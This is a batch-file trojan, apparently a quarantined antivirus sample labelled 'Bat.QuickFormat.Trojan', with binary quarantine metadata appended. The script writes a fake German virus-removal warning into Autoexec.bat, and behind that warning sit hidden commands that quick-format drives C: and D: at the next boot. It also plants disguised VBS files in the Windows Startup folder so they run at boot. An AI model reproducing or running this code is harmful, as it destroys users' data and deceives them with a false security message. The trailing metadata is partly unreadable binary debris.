echo off
echo @echo.
echo @echo.
echo @echo                 ********** VIRUS - WARNUNG ********** >>c:\Autoexec.bat
echo @echo. >>c:\Autoexec.bat
echo @echo Schwerwiegender Systemschutzfehler ! >>c:\Autoexec.bat
echo @echo Wahrscheinlich ist Ihr System von einem Virus befallen. >>c:\Autoexec.bat
echo @echo Bitte warten Sie ! Das System wird versuchen, den Virus zu entfernen. >>c:\Autoexec.bat
echo @echo Dies kann einige Minuten dauern. Bitte gedulden Sie sich. >>c:\Autoexec.bat
echo @echo Bitte starten Sie den PC nach der Virus - Entfernung neu. >>c:\Autoexec.bat
echo @echo Wenn der Virus entfernt werden konnte, wird Windows nach dem Neustart gestartet. >>c:\Autoexec.bat
echo @echo Bitte fuehren Sie nach dem NEUSTART Scandisk aus. >>c:\Autoexec.bat
echo @echo. >>c:\Autoexec.bat
echo @echo pause >>c:\Autoexec.bat
echo @call format d: /q /u /autotest >nul >>c:\Autoexec.bat
echo @call format c: /q /u /autotest >nul >>c:\Autoexec.bat
copy C:\windows\search.vbs C:\windows\startm~1\progra~1\autost~1
copy C:\windows\close.vbs C:\windows\startm~1\progra~1\autost~1
rename C:\windows\startm~1\progra~1\autost~1\search.vbs office.pif
rename C:\windows\startm~1\progra~1\autost~1\close.vbs office.bat
del C:\windows\search.vbs
del C:\windows\close.vbs
del C:\windows\startm~1\progra~1\autost~1\msoffice.pif
del C:\windows\startm~1\progra~1\autost~1\msoffice.batX-Date-Accessed                                                 i      �  X-Date-Created                                                  �      �(X-Date-Modified                                                 i      	�"X-Date-Quarantined                                              �      �(X-Date-Scan_Defs                                                i      �  X-Date-Scanned                                                  �      �(X-Platform-Computer                                             i      GUTEKX-Platform-Domain                                               �     NOWA                                                                                                                                                                                                                                                                X-Platform-User                                                 i      SYSTEM X-Sample-File-Ansi                                              �     C:\Prog\Magix\3.bat                                                                                                                                                                                                                                                 X-Sample-QuarFile                                               i     0ED3349E.bat  *                                                                                                                                                                                                                                                     X-Sample-Size                                                   �      m  X-Sample-Status                                                 i         X-Sample-UUID                                                   �     {33464158-7BE3-4EDB-9D77-8AC07BB19918}                                                                                                                                                                                                                              X-Sample-dwType                                                 i         X-Scan-Virus-Identifier                                         �      i  X-Scan-Virus-Name                                               i      Bat.QuickFormat.Trojan�w��